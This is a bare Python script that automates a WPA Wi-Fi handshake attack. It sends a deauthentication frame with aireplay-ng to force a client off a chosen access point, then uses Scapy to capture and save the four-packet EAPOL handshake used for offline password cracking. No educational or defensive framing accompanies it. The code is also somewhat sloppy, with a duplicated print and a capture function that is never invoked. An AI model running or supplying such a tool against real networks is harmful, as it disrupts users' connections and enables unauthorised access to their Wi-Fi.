import subprocess
from scapy.all import *

def extract_handshake(bssid, client_mac, wlan_interface):
    command = ["sudo", "aireplay-ng", "-0", "1", "-a", bssid, "-c", client_mac, "--ignore-negative-one", wlan_interface]
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    while True:
        output = process.stdout.readline().decode()
        if output == '' and process.poll() is not None:
            break
        if output:
            print(output.strip())
    _, error = process.communicate()
    if process.returncode != 0:
        raise subprocess.CalledProcessError(process.returncode, command, output=error)


extract_handshake('MAC_1','MAC_2','wlan0mon')


def capture_handshake(channel, bssid, wlan_interface, output_file):
    # Set up the filter for capturing only the necessary packets
    filter_str = f"wlan host {bssid} and (wlan type mgt subtype beacon or wlan type mgt subtype probe-req or wlan type mgt subtype probe-resp or wlan type data subtype qos-data)"

    # Use Scapy's sniff function to capture packets
    packets = sniff(iface=wlan_interface, filter=filter_str, timeout=60)

    # Save the captured packets to a file
    wrpcap(output_file, packets)

    # Extract the EAPOL packets from the captured packets
    eapol_packets = [p for p in packets if p.haslayer(EAPOL)]

    if len(eapol_packets) == 0:
        print("No EAPOL packets captured. Handshake not captured.")
        return False

    if len(eapol_packets) < 4:
        print("Incomplete handshake captured. Handshake not captured.")
        return False

    # Extract the 4 EAPOL packets that form the handshake
    eapol_handshake = eapol_packets[:4]
    print(eapol_handshake)
    import os
    output_file = os.getcwd() + '/' + output_file
    print(eapol_handshake)
    # Write the EAPOL packets to a file
    wrpcap(output_file, eapol_handshake, append=True)

    print("Handshake captured successfully.")
    return True
